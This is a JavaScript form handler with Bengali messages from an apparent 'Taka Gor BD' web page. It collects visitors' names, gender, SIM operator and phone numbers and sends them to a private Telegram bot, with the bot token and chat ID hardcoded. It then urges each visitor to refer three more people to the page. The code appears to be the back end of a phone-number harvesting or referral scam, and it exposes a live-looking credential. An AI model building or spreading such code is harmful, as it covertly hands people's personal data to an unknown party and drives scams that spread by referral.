function submitForm() {
    let name = document.getElementById("name").value;
    let gender = document.getElementById("gender").value;
    let sim = document.getElementById("sim").value;
    let number = document.getElementById("number").value;

    if (name === "" || number === "") {
        alert("সব তথ্য পূরণ করুন!");
        return;
    }

    // টেলিগ্রাম বটে পাঠানোর জন্য তথ্য গঠন
    let botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
    let chatId = "7294674899";
    let message = `😋 লিঙ্গ : ${gender}\n💥নাম : ${name}\n💬সিম : ${sim}\n👌নাম্বার : ${number}`;

    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    // টেলিগ্রামে পাঠানোর জন্য API কল
    fetch(telegramURL)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("✅ সফলভাবে আপনার নাম্বার সাবমিট হয়েছে!\n📢 দ্রুত তিনজনকে রেফার করুন:\nhttps://nahidxsr.github.io/Taka-Gor-BD/");
            } else {
                alert("❌ সাবমিশনে সমস্যা হয়েছে, আবার চেষ্টা করুন!");
            }
        })
        .catch(error => {
            alert("❌ নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।");
        });
}
